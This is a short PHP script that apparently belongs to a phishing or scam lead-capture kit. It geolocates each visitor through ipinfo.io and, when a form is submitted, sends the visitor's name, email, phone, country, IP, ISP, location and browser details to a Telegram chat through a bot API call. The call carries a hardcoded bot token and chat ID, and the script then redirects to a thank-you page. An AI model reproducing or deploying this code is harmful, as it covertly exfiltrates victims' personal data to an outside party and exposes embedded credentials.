<?php
$ip = $_SERVER['REMOTE_ADDR'];


@ $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
@ $hostname=gethostbyaddr($_SERVER['REMOTE_ADDR']);
$QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);
$string =$QUERY_STRING.PHP_EOL .PHP_EOL .
'[IP address]: '.$ip.PHP_EOL .PHP_EOL .
'[Hostname]: '.$hostname.PHP_EOL .PHP_EOL .
'[Browser and OS]: '.$_SERVER['HTTP_USER_AGENT'] .PHP_EOL . $_SERVER['HTTP_REFERER'].PHP_EOL .PHP_EOL .
'[Coordinates]: '.$details->loc. PHP_EOL .PHP_EOL .
'[ISP provider]: '.$details->org. PHP_EOL .PHP_EOL .
'[City]: '.$details->city. PHP_EOL .PHP_EOL .
'[State]: '.$details->region. PHP_EOL .PHP_EOL .
'[Country]: '.$details->country. PHP_EOL .PHP_EOL .
'[Date]: '.date("D dS M,Y h:i a");


    if(isset($_POST['formasubmitapeal']))
    {
		
	
        $apiToken = "5174271273:AAFcsWP0YRZ6bNzkXLq9EYt0L7s9Ic1i2Ck";
        $data = [
    'chat_id' => '-1001785402189', 
    'text' => '==========>NEW LEAD<=========='. PHP_EOL .'Full Name: '.$_POST['name1']. PHP_EOL .'Email Address: '.$_POST['email1']. PHP_EOL .'Phone:  '.$_POST['phone1']. PHP_EOL .'Country:  '.$_POST['country1']. PHP_EOL .'Experience:  '.$_POST['zip1']. PHP_EOL .'Ip address: ' .$ip
    . PHP_EOL . 'Country:  ' .$details->country. PHP_EOL . 'State:  ' .$details->region. PHP_EOL . 'City:  ' .$details->city. PHP_EOL . 'ISP:  ' .$details->org . PHP_EOL . '[Browser and OS]: '.$_SERVER['HTTP_USER_AGENT'] .PHP_EOL . $_SERVER['HTTP_REFERER']
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
								 
								 
		header("Location:thankyou.php");						 
  }  


  
?>